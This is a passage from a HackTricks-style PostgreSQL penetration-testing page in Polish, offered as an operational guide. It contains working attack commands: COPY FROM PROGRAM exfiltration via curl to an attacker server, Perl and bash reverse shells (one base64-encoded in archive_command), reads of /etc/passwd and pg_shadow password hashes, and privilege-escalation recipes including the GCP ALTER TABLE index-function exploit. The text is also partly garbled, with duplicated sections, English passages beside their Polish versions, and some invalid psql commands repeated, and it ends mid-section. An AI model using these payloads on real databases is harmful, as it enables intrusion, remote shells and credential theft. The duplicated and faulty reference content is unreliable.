# 5432,5433 - Testowanie penetracyjne PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

**PostgreSQL** jest opisywany jako **system bazodanowy obiektowo-relacyjny**, który jest **open source**. Ten system nie tylko wykorzystuje język SQL, ale także go ulepsza, dodając dodatkowe funkcje. Jego możliwości pozwalają mu obsługiwać szeroki zakres typów danych i operacji, co czyni go wszechstronnym wyborem dla programistów i organizacji.

**Domyślny port:** 5432, a jeśli ten port jest już używany, wydaje się, że postgresql użyje następnego portu (prawdopodobnie 5433), który nie jest używany.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Połączenie i podstawowe wyliczenia

### Połączenie

Aby nawiązać połączenie z serwerem PostgreSQL, można użyć narzędzia `psql` lub innych klientów PostgreSQL. Poniżej przedstawiono przykład połączenia z serwerem:

```bash
psql -h <adres_serwera> -p <port> -U <użytkownik> -d <baza_danych>
```

### Podstawowe wyliczenia

Po nawiązaniu połączenia z serwerem PostgreSQL, można przeprowadzić podstawowe wyliczenia, takie jak:

- Wyświetlanie listy dostępnych baz danych:
```sql
\l
```

- Wybieranie konkretnej bazy danych:
```sql
\c <nazwa_bazy_danych>
```

- Wyświetlanie listy tabel w bieżącej bazie danych:
```sql
\dt
```

- Wyświetlanie schematu tabeli:
```sql
\d+ <nazwa_tabeli>
```

- Wyświetlanie zawartości tabeli:
```sql
SELECT * FROM <nazwa_tabeli>;
```

- Wyświetlanie informacji o indeksach tabeli:
```sql
\di+ <nazwa_tabeli>
```

- Wyświetlanie informacji o funkcjach:
```sql
\df
```

- Wyświetlanie informacji o użytkownikach:
```sql
\du
```

- Wyświetlanie informacji o widokach:
```sql
\dv
```

- Wyświetlanie informacji o sekwencjach:
```sql
\ds
```

- Wyświetlanie informacji o typach danych:
```sql
\dT
```

- Wyświetlanie informacji o operatorach:
```sql
\dO
```

- Wyświetlanie informacji o rozszerzeniach:
```sql
\dx
```

- Wyświetlanie informacji o tabelach systemowych:
```sql
\dS
```

- Wyświetlanie informacji o widokach systemowych:
```sql
\dV
```

- Wyświetlanie informacji o sekwencjach systemowych:
```sql
\dq
```

- Wyświetlanie informacji o typach danych systemowych:
```sql
\dtS
```

- Wyświetlanie informacji o operatorach systemowych:
```sql
\doS
```

- Wyświetlanie informacji o rozszerzeniach systemowych:
```sql
\dxS
```

- Wyświetlanie informacji o funkcjach systemowych:
```sql
\dfS
```

- Wyświetlanie informacji o użytkownikach systemowych:
```sql
\duS
```

- Wyświetlanie informacji o tabelach systemowych:
```sql
\dS
```

- Wyświetlanie informacji o widokach systemowych:
```sql
\dV
```

- Wyświetlanie informacji o sekwencjach systemowych:
```sql
\dq
```

- Wyświetlanie informacji o typach danych systemowych:
```sql
\dtS
```

- Wyświetlanie informacji o operatorach systemowych:
```sql
\doS
```

- Wyświetlanie informacji o rozszerzeniach systemowych:
```sql
\dxS
```

- Wyświetlanie informacji o funkcjach systemowych:
```sql
\dfS
```

- Wyświetlanie informacji o użytkownikach systemowych:
```sql
\duS
```

To tylko kilka przykładów podstawowych wyliczeń, które można przeprowadzić w PostgreSQL. Istnieje wiele innych polecenia, które można użyć do eksploracji bazy danych i uzyskania informacji o jej strukturze i zawartości.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Jeśli wykonując **`\list`** znajdziesz bazę danych o nazwie **`rdsadmin`**, to wiesz, że jesteś wewnątrz bazy danych **AWS PostgreSQL**.
{% endhint %}

Aby uzyskać więcej informacji na temat **jak nadużywać bazy danych PostgreSQL**, sprawdź:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Automatyczne wyliczanie
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Atak siłowy**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Skanowanie portów**

Zgodnie z [**tym badaniem**](https://www.exploit-db.com/papers/13084), gdy próba połączenia nie powiedzie się, `dblink` generuje wyjątek `sqlclient_unable_to_establish_sqlconnection`, zawierający wyjaśnienie błędu. Poniżej przedstawiono przykłady tych szczegółów.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host jest niedostępny

`SZCZEGÓŁY: nie można połączyć się z serwerem: Brak trasy do hosta. Czy serwer działa na hoście "1.2.3.4" i akceptuje połączenia TCP/IP na porcie 5678?`

* Port jest zamknięty
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port jest otwarty
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
lub
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port jest otwarty lub filtrowany
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
W funkcjach PL/pgSQL nie jest obecnie możliwe uzyskanie szczegółów dotyczących wyjątków. Jednak jeśli masz bezpośredni dostęp do serwera PostgreSQL, możesz pobrać potrzebne informacje. Jeśli wydobycie nazw użytkowników i haseł z tabel systemowych nie jest możliwe, możesz rozważyć wykorzystanie metody ataku słownikowego omówionej w poprzednim rozdziale, ponieważ może to potencjalnie przynieść pozytywne rezultaty.

## Wyliczanie uprawnień

### Role

| Typy ról      |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rola ma uprawnienia superużytkownika                                                                                                                        |
| rolinherit     | Rola automatycznie dziedziczy uprawnienia ról, do których należy                                                                                    |
| rolcreaterole  | Rola może tworzyć więcej ról                                                                                                                           |
| rolcreatedb    | Rola może tworzyć bazy danych                                                                                                                            |
| rolcanlogin    | Rola może się zalogować. Oznacza to, że ta rola może być użyta jako początkowy identyfikator autoryzacji sesji                                                     |
| rolreplication | Rola jest rolą replikacji. Rola replikacji może inicjować połączenia replikacji oraz tworzyć i usuwać gniazda replikacji.                           |
| rolconnlimit   | Dla ról, które mogą się zalogować, ustawia maksymalną liczbę równoczesnych połączeń, jakie ta rola może nawiązać. Wartość -1 oznacza brak limitu.                                 |
| rolpassword    | Nie jest to hasło (zawsze odczytywane jako `********`)                                                                                                        |
| rolvaliduntil  | Czas wygaśnięcia hasła (używany tylko dla uwierzytelniania hasłem); null, jeśli brak wygaśnięcia                                                                  |
| rolbypassrls   | Rola omija każdą politykę zabezpieczeń na poziomie wiersza, zobacz [Sekcję 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) dla więcej informacji. |
| rolconfig      | Domyślne wartości zmiennych konfiguracyjnych dla danej roli                                                                                          |
| oid            | ID roli                                                                                                                                           |

#### Interesujące grupy

* Jeśli jesteś członkiem **`pg_execute_server_program`**, możesz **wykonywać** programy
* Jeśli jesteś członkiem **`pg_read_server_files`**, możesz **czytać** pliki
* Jeśli jesteś członkiem **`pg_write_server_files`**, możesz **pisać** pliki

{% hint style="info" %}
Należy zauważyć, że w Postgresie **użytkownik**, **grupa** i **rola** to to samo. To zależy tylko od **sposobu użycia** i czy **pozwolisz na logowanie**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele

PostgreSQL uses tables to store data. A table is a collection of rows, where each row represents a single record and each column represents a specific attribute of that record.

To view the tables in a PostgreSQL database, you can use the following SQL query:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

This query retrieves the names of all tables in the `public` schema of the database.

To view the columns of a specific table, you can use the following SQL query:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';
```

Replace `table_name` with the name of the table you want to inspect.

### Tabele

PostgreSQL używa tabel do przechowywania danych. Tabela to zbiór wierszy, gdzie każdy wiersz reprezentuje pojedynczy rekord, a każda kolumna reprezentuje określony atrybut tego rekordu.

Aby wyświetlić tabele w bazie danych PostgreSQL, można użyć następującego zapytania SQL:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

To zapytanie pobiera nazwy wszystkich tabel w schemacie `public` bazy danych.

Aby wyświetlić kolumny konkretnej tabeli, można użyć następującego zapytania SQL:

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';
```

Zamień `table_name` na nazwę tabeli, którą chcesz sprawdzić.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcje

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages such as SQL, PL/pgSQL, Python, etc.

Funkcje w PostgreSQL to nazwane bloki kodu, które można wykonać, wywołując ich nazwę. Służą do wykonywania określonych zadań i mogą przyjmować parametry oraz zwracać wartości. Funkcje można tworzyć za pomocą instrukcji `CREATE FUNCTION` i można je pisać w różnych językach programowania, takich jak SQL, PL/pgSQL, Python itp.

#### Creating Functions

#### Tworzenie funkcji

To create a function, you need to specify the function name, input parameters (if any), return type, and the code block that defines the function's behavior. Here is the basic syntax for creating a function:

Aby utworzyć funkcję, musisz określić nazwę funkcji, parametry wejściowe (jeśli istnieją), typ zwracany oraz blok kodu, który definiuje zachowanie funkcji. Oto podstawowa składnia tworzenia funkcji:

```sql
CREATE FUNCTION function_name (parameter1 datatype, parameter2 datatype, ...)
  RETURNS return_type
  LANGUAGE language_name
AS
$$
  -- Function code goes here
$$;
```

The `function_name` is the name of the function, `parameter1`, `parameter2`, etc. are the input parameters with their respective data types, `return_type` is the data type of the value returned by the function, and `language_name` is the programming language used to write the function code.

`function_name` to nazwa funkcji, `parameter1`, `parameter2`, itd. to parametry wejściowe wraz z ich odpowiednimi typami danych, `return_type` to typ danych zwracanych przez funkcję, a `language_name` to język programowania używany do pisania kodu funkcji.

#### Calling Functions

#### Wywoływanie funkcji

Once a function is created, you can call it by using its name followed by the input parameter values (if any). The function will execute its code block and return the specified value.

Po utworzeniu funkcji można ją wywołać, używając jej nazwy, a następnie wartości parametrów wejściowych (jeśli istnieją). Funkcja wykona swój blok kodu i zwróci określoną wartość.

```sql
SELECT function_name(parameter1, parameter2, ...);
```

#### Dropping Functions

#### Usuwanie funkcji

To remove a function from the database, you can use the `DROP FUNCTION` statement followed by the function name and its input parameter types (if any).

Aby usunąć funkcję z bazy danych, można użyć instrukcji `DROP FUNCTION`, a następnie podać nazwę funkcji oraz jej typy parametrów wejściowych (jeśli istnieją).

```sql
DROP FUNCTION function_name(parameter1 datatype, parameter2 datatype, ...);
```

It is important to note that dropping a function will permanently remove it from the database, so use this command with caution.

Warto zauważyć, że usunięcie funkcji spowoduje jej trwałe usunięcie z bazy danych, dlatego używaj tej komendy ostrożnie.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Akcje na systemie plików

### Odczytywanie katalogów i plików

Od tego [**commita**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) członkowie zdefiniowanej grupy **`DEFAULT_ROLE_READ_SERVER_FILES`** (zwanej **`pg_read_server_files`**) oraz **super użytkownicy** mogą używać metody **`COPY`** na dowolnej ścieżce (sprawdź `convert_and_check_filename` w `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Pamiętaj, że jeśli nie jesteś super użytkownikiem, ale masz uprawnienia **CREATEROLE**, możesz **dodać siebie do tej grupy:**
```sql
GRANT pg_read_server_files TO username;
```
[**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Istnieją **inne funkcje postgres**, które można użyć do **odczytu pliku lub listowania katalogu**. Tylko **superużytkownicy** i **użytkownicy z wyraźnymi uprawnieniami** mogą z nich korzystać:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Możesz znaleźć **więcej funkcji** na stronie [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Proste zapisywanie plików

Tylko **super użytkownicy** i członkowie grupy **`pg_write_server_files`** mogą używać polecenia copy do zapisywania plików.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Pamiętaj, że jeśli nie jesteś super użytkownikiem, ale masz uprawnienia **`CREATEROLE`**, możesz **dodać siebie do tej grupy:**
```sql
GRANT pg_write_server_files TO username;
```
[**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Pamiętaj, że COPY nie obsługuje znaków nowej linii, dlatego nawet jeśli używasz ładunku base64, **musisz wysłać jednolinijkowiec**.\
Bardzo ważnym ograniczeniem tej techniki jest to, że **`copy` nie może być używane do zapisywania plików binarnych, ponieważ modyfikuje niektóre wartości binarne**.

### **Przesyłanie plików binarnych**

Jednak istnieją **inne techniki przesyłania dużych plików binarnych:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Wskazówka dotycząca bug bounty**: **Zarejestruj się** na platformie **Intigriti**, premium platformie **bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE do programu**

Od [wersji 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html) tylko **super użytkownicy** i członkowie grupy **`pg_execute_server_program`** mogą używać copy do RCE (przykład z eksfiltracją:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Przykład wykonania:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Pamiętaj, że jeśli nie jesteś super użytkownikiem, ale masz uprawnienia **`CREATEROLE`**, możesz **dodać siebie do tej grupy:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Lub użyj modułu `multi/postgres/postgres_copy_from_program_cmd_exec` z **metasploita**.\
Więcej informacji na temat tej podatności [**tutaj**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Podczas zgłaszania jako CVE-2019-9193, Postges oświadczył, że jest to [funkcja i nie zostanie naprawiona](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE z językami PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE z rozszerzeniami PostgreSQL

Po **zapoznaniu się** z poprzednim postem **jak przesyłać pliki binarne**, możesz spróbować uzyskać **RCE przesyłając rozszerzenie PostgreSQL i je wczytując**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE z plikiem konfiguracyjnym PostgreSQL

Plik **konfiguracyjny** PostgreSQL jest **zapisywalny** przez użytkownika **postgres**, który uruchamia bazę danych, więc jako **superużytkownik** możesz zapisywać pliki w systemie plików i tym samym możesz **nadpisać ten plik**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE z ssl\_passphrase\_command**

Więcej informacji [o tej technice tutaj](https://pulsesecurity.co.nz/articles/postgres-sqli).

Plik konfiguracyjny ma kilka interesujących atrybutów, które mogą prowadzić do RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ścieżka do prywatnego klucza bazy danych
* `ssl_passphrase_command = ''` Jeśli plik prywatny jest chroniony hasłem (zaszyfrowany), PostgreSQL **wykona polecenie wskazane w tym atrybucie**.
* `ssl_passphrase_command_supports_reload = off` **Jeśli** ten atrybut jest **włączony**, **polecenie** wykonane, jeśli klucz jest chroniony hasłem, **zostanie wykonane** podczas wykonywania `pg_reload_conf()`.

Następnie atakujący musi:

1. **Wydumpować prywatny klucz** z serwera
2. **Zaszyfrować** pobrany prywatny klucz:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Nadpisać**
4. **Wydumpować** bieżącą **konfigurację** PostgreSQL
5. **Nadpisać** **konfigurację** z konfiguracją wymienionych atrybutów:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Wykonać `pg_reload_conf()`

Podczas testowania zauważyłem, że to zadziała tylko wtedy, gdy **plik klucza prywatnego ma uprawnienia 640**, jest **własnością roota** i **grupy ssl-cert lub postgres** (aby użytkownik postgres mógł go odczytać) oraz znajduje się w _/var/lib/postgresql/12/main_.

#### **RCE z archive\_command**

**Więcej** [**informacji na temat tej konfiguracji i o WAL tutaj**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Innym atrybutem w pliku konfiguracyjnym, który można wykorzystać, jest `archive_command`.

Aby to działało, ustawienie `archive_mode` musi być `'on'` lub `'always'`. Jeśli tak jest, możemy nadpisać polecenie w `archive_command` i zmusić je do wykonania za pomocą operacji WAL (write-ahead logging).

Ogólne kroki to:

1. Sprawdź, czy tryb archiwizacji jest włączony: `SELECT current_setting('archive_mode')`
2. Nadpisz `archive_command` za pomocą payloadu. Na przykład, odwrócony shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Przeładuj konfigurację: `SELECT pg_reload_conf()`
4. Wymuś wykonanie operacji WAL, co spowoduje wywołanie polecenia archiwizacji: `SELECT pg_switch_wal()` lub `SELECT pg_switch_xlog()` dla niektórych wersji Postgresa

## **Podwyższanie uprawnień w Postgres**

### Podwyższanie uprawnień CREATEROLE

#### **Grant**

Zgodnie z [**dokumentacją**](https://www.postgresql.org/docs/13/sql-grant.html): _Role posiadające uprawnienie **`CREATEROLE`** mogą **udzielać lub odbierać członkostwo w dowolnej roli**, która **nie jest** superużytkownikiem._

Więc jeśli masz uprawnienie **`CREATEROLE`**, możesz przyznać sobie dostęp do innych **ról** (które nie są superużytkownikami), co może dać ci możliwość odczytu i zapisu plików oraz wykonywania poleceń:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Zmiana hasła

Użytkownicy z tą rolą mogą również **zmieniać** **hasła** innych **nie-superużytkowników**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Przywileje SUPERUSER

Często zdarza się, że **lokalni użytkownicy mogą zalogować się do PostgreSQL bez podawania hasła**. Dlatego, gdy już zdobędziesz **uprawnienia do wykonywania kodu**, możesz wykorzystać te uprawnienia, aby uzyskać rolę **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
To jest zazwyczaj możliwe ze względu na następujące linie w pliku **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

W [**tym opracowaniu**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wyjaśniono, jak było możliwe **privesc** w Postgres GCP, wykorzystując przywileje ALTER TABLE, które zostały przyznane użytkownikowi.

Przy próbie **ustawienia innego użytkownika jako właściciela tabeli** powinien pojawić się **błąd** uniemożliwiający to, ale wygląda na to, że GCP dało tę **opcję użytkownikowi postgres, który nie jest superużytkownikiem** w GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Łącząc tę ideę z faktem, że gdy polecenia **INSERT/UPDATE/ANALYZE** są wykonywane na **tabeli z funkcją indeksu**, funkcja jest **wywoływana** jako część polecenia z **uprawnieniami właściciela tabeli**. Możliwe jest utworzenie indeksu z funkcją i nadanie uprawnień właściciela **superużytkownikowi** dla tej tabeli, a następnie uruchomienie ANALYZE na tabeli z złośliwą funkcją, która będzie mogła wykonywać polecenia, ponieważ korzysta z uprawnień właściciela.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Wykorzystanie

1. Rozpocznij od utworzenia nowej tabeli.
2. Wstaw nieistotne treści do tabeli, aby dostarczyć dane dla funkcji indeksu.
3. Opracuj złośliwą funkcję indeksu zawierającą ładunek wykonania kodu, umożliwiający wykonanie nieautoryzowanych poleceń.
4. Zmień właściciela tabeli na "cloudsqladmin", który jest rolą superużytkownika GCP używaną wyłącznie przez Cloud SQL do zarządzania i utrzymania bazy danych.
5. Wykonaj operację ANALYZE na tabeli. Ta czynność zmusza silnik PostgreSQL do przełączenia się na kontekst użytkownika właściciela tabeli, "cloudsqladmin". W rezultacie złośliwa funkcja indeksu jest wywoływana z uprawnieniami "cloudsqladmin", umożliwiając wykonanie wcześniej nieautoryzowanego polecenia powłoki.

W PostgreSQL ten proces wygląda mniej więcej tak:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Następnie tabela `shell_commands_results` będzie zawierać wynik wykonanego kodu:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalne logowanie

Niektóre źle skonfigurowane instancje postgresql mogą umożliwiać logowanie dowolnego lokalnego użytkownika. Możliwe jest lokalne logowanie z adresu 127.0.0.1 przy użyciu funkcji **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Należy zauważyć, że dla poprzedniego zapytania **funkcja `dblink` musi istnieć**. Jeśli jej nie ma, można spróbować ją utworzyć za pomocą
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Jeśli masz hasło użytkownika o większych uprawnieniach, ale użytkownik nie może logować się z zewnętrznego adresu IP, możesz użyć następującej funkcji do wykonywania zapytań jako ten użytkownik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Możliwe jest sprawdzenie, czy ta funkcja istnieje za pomocą:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Niestandardowa zdefiniowana funkcja z** SECURITY DEFINER

[W tym opracowaniu](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesterzy byli w stanie uzyskać podwyższenie uprawnień w instancji postgres dostarczonej przez IBM, ponieważ **znaleźli tę funkcję z flagą SECURITY DEFINER**:

